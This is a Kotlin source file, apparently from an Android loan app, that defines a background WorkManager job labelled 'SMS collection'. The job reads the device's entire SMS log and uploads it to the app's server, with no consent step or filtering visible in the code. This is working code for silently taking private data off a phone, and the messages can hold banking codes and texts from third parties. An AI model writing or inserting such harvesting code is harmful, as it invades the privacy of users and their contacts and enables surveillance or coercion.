package com.loanspeed.speed.util.workManager

import android.content.Context
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.gson.Gson
import com.loanspeed.speed.CharmApplication
import com.loanspeed.speed.ext.createBody
import com.loanspeed.speed.net.ApiServices
import com.loanspeed.speed.net.HttpManager
import com.loanspeed.speed.util.ContactUtil


/**
 * 短信收集
 */
class SmsWM (private val context: Context, params: WorkerParameters) :
    CoroutineWorker(context, params) {

    private val goon = Gson()
    private val mApiService by lazy { HttpManager.create(ApiServices::class.java) }

    override suspend fun doWork(): Result {
        try {
            val smsMessageList = ContactUtil.getSmsMessageLog(CharmApplication.instance)
            val map = HashMap<String,Any>()
            map["sms_list"] = smsMessageList
            mApiService.upSmsMessageList(map.createBody())
            return Result.success()
        } catch (e: Exception) {
            return Result.failure()
        }

    }

}